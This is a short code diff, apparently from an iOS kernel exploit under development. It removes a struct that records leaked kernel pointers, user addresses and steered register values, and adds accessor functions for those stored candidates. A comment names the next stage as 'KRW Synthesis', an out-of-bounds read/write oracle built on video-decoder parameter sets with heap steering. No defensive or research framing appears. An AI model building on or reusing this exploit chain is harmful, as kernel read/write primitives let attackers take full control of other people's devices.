@@ -2634,21 +2634,16 @@ static CVPixelBufferRef KPH9CreatePixelBuffer(int width, int height) {
     return pb;
 }
 
-typedef struct {
-    uint64_t kptr;
-    vm_address_t userVA;
-    vm_address_t regionBase;
-    vm_size_t regionSize;
-    unsigned int userTag;
-    unsigned char shareMode;
-    unsigned int objectId;
-    int steeredNTL;
-    uint64_t steeredX0;
-    uint64_t ctxWords[8];
-} Stage5KPtrRecord;
-
 static Stage5KPtrRecord gStage5Cands[16];
 static int gStage5CandCount = 0;
+
+const Stage5KPtrRecord *KPH9GetStage5Candidate(int idx) {
+    if (idx >= 0 && idx < gStage5CandCount) return &gStage5Cands[idx];
+    return NULL;
+}
+int KPH9GetStage5CandidateCount(void) {
+    return gStage5CandCount;
+}
 
 // === Stage 8: KRW Synthesis — Multi-PPS OOB Read/Write Oracle, DPB/RPS Alias Readback & Dynamic NTL Heap Steering ===
 static void RunStage8_KRWPrimitiveAndReadWriteBridge(NSMutableString *log) {
